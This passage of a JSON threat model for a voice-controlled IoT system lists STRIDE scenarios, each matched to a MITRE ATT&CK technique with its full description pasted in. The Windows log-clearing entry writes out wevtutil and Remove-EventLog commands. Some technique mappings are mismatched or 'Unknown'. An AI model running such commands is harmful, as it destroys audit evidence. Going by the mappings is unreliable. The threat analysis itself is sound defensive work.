                    "Assumption": "The attacker can exploit these vulnerabilities to control the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker possesses the necessary tools and knowledge."
                },
                {
                    "Assumption": "The server does not adequately authenticate the IoT controller.",
                    "Role": "System",
                    "Condition": "Valid if the communication authentication is weak or nonexistent."
                }
            ],
            "Potential Impact": "Unauthorized actions and manipulation of connected IoT devices.",
            "MITRE ATT&CK Keywords": [
                "identity_spoofing",
                "controller_exploitation",
                "device_impersonation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter the data being sent from the microphone to the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and modify the audio data stream.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has access to the communication path or the physical microphone."
                },
                {
                    "Assumption": "The client-side application does not verify the integrity of the received audio data.",
                    "Role": "System",
                    "Condition": "Valid if there is no integrity verification mechanism in place."
                },
                {
                    "Assumption": "The microphone or associated hardware is accessible to the attacker.",
                    "Role": "Hardware",
                    "Condition": "Valid if the hardware is not securely installed."
                }
            ],
            "Potential Impact": "Corruption of audio data leading to incorrect or harmful responses and actions.",
            "MITRE ATT&CK Keywords": [
                "data_tampering",
                "audio_data",
                "network",
                "hardware_tampering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify the software on the IoT devices to perform unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The IoT devices have inadequate software protection mechanisms.",
                    "Role": "IoT Devices",
                    "Condition": "Valid if the devices lack proper security measures such as secure boot or software signing."
                },
                {
                    "Assumption": "The attacker can deploy modified software to the IoT devices.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can physically or remotely access the devices to upload software."
                },
                {
                    "Assumption": "There is no regular integrity check on the software running on IoT devices.",
                    "Role": "System",
                    "Condition": "Valid if the system does not perform regular checks to ensure software integrity."
                }
            ],
            "Potential Impact": "Executing unauthorized and potentially dangerous commands affecting the environment and users.",
            "MITRE ATT&CK Keywords": [
                "data_tampering",
                "firmware_update",
                "device_control",
                "software_modification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the server-side application to alter its response logic.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to the server infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can breach the server network or exploit vulnerabilities in the server software."
                },
                {
                    "Assumption": "The server does not have effective security measures such as code integrity checks or access controls.",
                    "Role": "System",
                    "Condition": "Valid if there are weak or nonexistent security measures protecting the server."
                },
                {
                    "Assumption": "Changes to the server application are not logged or monitored.",
                    "Role": "System",
                    "Condition": "Valid if there is an absence of logging and monitoring for server changes."
                }
            ],
            "Potential Impact": "Altered responses from the server, leading to misinformation and unintended actions.",
            "MITRE ATT&CK Keywords": [
                "data_tampering",
                "server_exploitation",
                "response_manipulation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a specific voice command that led to a critical action.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log voice commands and corresponding actions reliably.",
                    "Role": "System",
                    "Condition": "Valid if the system does not have comprehensive logging mechanisms."
                },
                {
                    "Assumption": "Voice commands are not linked to individual users uniquely.",
                    "Role": "System",
                    "Condition": "Valid if user actions cannot be distinctly attributed."
                },
                {
                    "Assumption": "The system allows for critical actions to be performed without stringent authentication.",
                    "Role": "System",
                    "Condition": "Valid if sensitive actions do not require additional verification steps."
                }
            ],
            "Potential Impact": "Inability to hold users accountable for their actions, leading to potential misuse.",
            "MITRE ATT&CK Keywords": [
                "action_repudiation",
                "logging",
                "voice_commands",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator denies making crucial configuration changes within the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "System logs do not capture detailed information on administrative changes.",
                    "Role": "System",
                    "Condition": "Valid if the system's logging detail is insufficient to track administrative actions."
                },
                {
                    "Assumption": "The IoT controller lacks mechanisms to verify the authenticity of configuration changes.",
                    "Role": "IoT Controller",
                    "Condition": "Valid if changes can be made without authentication and verification."
                },
                {
                    "Assumption": "Multiple administrators share the same login credentials.",
                    "Role": "Administrators",
                    "Condition": "Valid if administrative access is not individualized."
                }
            ],
            "Potential Impact": "Difficulty in tracing responsibility for security breaches and misconfigurations.",
            "MITRE ATT&CK Keywords": [
                "action_repudiation",
                "configuration_changes",
                "logging",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service provider denies responsibility for a data inconsistency issue.",
            "Assumptions": [
                {
                    "Assumption": "The system relies on the cloud services for sensitive data storage.",
                    "Role": "System",
                    "Condition": "Valid if cloud services are used for data critical to operations."
                },
                {
                    "Assumption": "There is no clear accountability agreement between the IoT application and cloud provider.",
                    "Role": "System & Cloud Provider",
                    "Condition": "Valid if service agreements lack specific accountability terms."
                },
                {
                    "Assumption": "System logs are not consistently synchronized with cloud service logs.",
                    "Role": "System & Cloud Provider",
                    "Condition": "Valid if there is a lack of cross-system log consistency checks."
                }
            ],
            "Potential Impact": "Possible data corruption issues without clear traceability for resolution.",
            "MITRE ATT&CK Keywords": [
                "action_repudiation",
                "cloud_services",
                "data_integrity",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts audio transmissions between the microphone and client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel between the microphone and client is not encrypted.",
                    "Role": "System",
                    "Condition": "Valid if data is transmitted in an unsecured manner."
                },
                {
                    "Assumption": "The attacker has access to the network through which the data is transmitted.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can monitor network traffic."
                },
                {
                    "Assumption": "The system lacks mechanisms to detect and prevent such interceptions.",
                    "Role": "System",
                    "Condition": "Valid if intrusion detection systems are insufficient or nonexistent."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive audio data, leading to potential privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "data_exfiltration",
                "audio_data",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in cloud services is accessed by unauthorized third parties.",
            "Assumptions": [
                {
                    "Assumption": "The cloud storage does not have proper security measures in place.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if the cloud service lacks strong access controls and encryption."
                },
                {
                    "Assumption": "The data stored in the cloud is not encrypted or poorly encrypted.",
                    "Role": "System",
                    "Condition": "Valid if there is a lack of data encryption at rest."
                },
                {
                    "Assumption": "Access to cloud services is not monitored or logged effectively.",
                    "Role": "Cloud Service & System",
                    "Condition": "Valid if access logging is inadequate or nonexistent."
                }
            ],
            "Potential Impact": "Exposure of sensitive user and system data, potentially leading to various security and privacy issues.",
            "MITRE ATT&CK Keywords": [
                "data_theft",
                "cloud_services",
                "data_storage",
                "unauthorized_access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Debugging information from the server-side application leaks sensitive details.",
            "Assumptions": [
                {
                    "Assumption": "Debugging information is accessible to unauthorized users.",
                    "Role": "System",
                    "Condition": "Valid if sensitive debug logs are not secured."
                },
                {
                    "Assumption": "The server application logs sensitive information in plaintext.",
                    "Role": "System",
                    "Condition": "Valid if logs are not obfuscated or encrypted."
                },
                {
                    "Assumption": "There is no mechanism to control and audit access to debug information.",
                    "Role": "System",
                    "Condition": "Valid if access control mechanisms are weak or nonexistent."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive system information, aiding attackers in further exploits.",
            "MITRE ATT&CK Keywords": [
                "data_leakage",
                "debug_information",
                "server_logs",
                "unauthorized_access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server-side application with excessive voice command data, causing it to crash.",
            "Assumptions": [
                {
                    "Assumption": "The server cannot handle a high volume of concurrent requests.",
                    "Role": "System",
                    "Condition": "Valid if the server has limited processing capacity for simultaneous requests."
                },
                {
                    "Assumption": "There are no rate-limiting mechanisms in place.",
                    "Role": "System",
                    "Condition": "Valid if the application does not restrict the rate of incoming requests."
                },
                {
                    "Assumption": "The attacker has the capability to generate and send high volumes of requests.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can use automated tools to perform the attack."
                }
            ],
            "Potential Impact": "Disruption of service availability for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "resource_exhaustion",
                "dos_attack",
                "network",
                "voice_commands"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker utilizes a vulnerability in the IoT controller to halt operations of connected IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller has known or unknown vulnerabilities.",
                    "Role": "IoT Controller",
                    "Condition": "Valid if the controller's software is susceptible to exploitation."
                },
                {
                    "Assumption": "The attacker can exploit these vulnerabilities with malicious inputs.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has the necessary knowledge and tools."
                },
                {
                    "Assumption": "There are no effective intrusion prevention systems in place.",
                    "Role": "System",
                    "Condition": "Valid if the system lacks adequate defenses against such exploits."
                }
            ],
            "Potential Impact": "Complete shutdown or malfunction of IoT devices, impacting physical operations.",
            "MITRE ATT&CK Keywords": [
                "vulnerability_exploitation",
                "device_shutdown",
                "iot_controller",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A denial-of-service attack targets the cloud services to disrupt storage access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker knows the cloud service endpoints.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can identify the service URLs or IPs."
                },
                {
                    "Assumption": "The cloud service lacks effective mitigation measures for DDoS attacks.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if the service cannot adequately absorb or mitigate high-traffic attacks."
                },
                {
                    "Assumption": "Critical application data resides in the cloud services.",
                    "Role": "System",
                    "Condition": "Valid if essential data for application operation is stored in the cloud."
                }
            ],
            "Potential Impact": "Inaccessibility of crucial application and user data, leading to service disruption.",
            "MITRE ATT&CK Keywords": [
                "cloud_services",
                "dos_attack",
                "network",
                "data_storage"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker elevates privileges on the client-side application to access restricted functionalities.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has privilege escalation vulnerabilities.",
                    "Role": "Client-side Application",
                    "Condition": "Valid if the application code contains flaws that allow for privilege escalation."
                },
                {
                    "Assumption": "The attacker can manipulate the application to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can perform actions that trigger the vulnerabilities."
                },
                {
                    "Assumption": "There are no effective privilege separation mechanisms.",
                    "Role": "System",
                    "Condition": "Valid if the application does not enforce strict privilege separation."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive functionalities and potential misuse of IoT systems.",
            "MITRE ATT&CK Keywords": [
                "privilege_escalation",
                "client-side_application",
                "access_control",
                "network"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in cloud services to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The cloud services contain exploitable security flaws.",
                    "Role": "Cloud Services",
                    "Condition": "Valid if the cloud platform has security weaknesses."
                },
                {
                    "Assumption": "The attacker has the capability to discover and exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can identify and use vulnerabilities."
                },
                {
                    "Assumption": "Access controls are not sufficiently stringent.",
                    "Role": "Cloud Services",
                    "Condition": "Valid if the access controls do not effectively limit administrative access."
                }
            ],
            "Potential Impact": "Full administrative control over cloud components, potentially leading to data breaches and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "privilege_escalation",
                "cloud_services",
                "access_control",
                "administrative_access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker compromises the IoT controller to gain higher privileges and control all connected IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller has insufficient security measures to prevent privilege escalation.",
                    "Role": "IoT Controller",
                    "Condition": "Valid if the controller software lacks necessary security features."
                },
                {
                    "Assumption": "The attacker can exploit these weaknesses to gain higher privileges.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can use specific tools or techniques to exploit the vulnerabilities."
                },
                {
                    "Assumption": "There are no effective monitoring mechanisms.",
                    "Role": "System",
                    "Condition": "Valid if the system does not actively monitor for privilege escalation attempts."
                }
            ],
            "Potential Impact": "Unauthorized control over all connected IoT devices, leading to potential misuse and hazards.",
            "MITRE ATT&CK Keywords": [
                "privilege_escalation",
                "iot_controller",
                "device_control",
                "network"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). 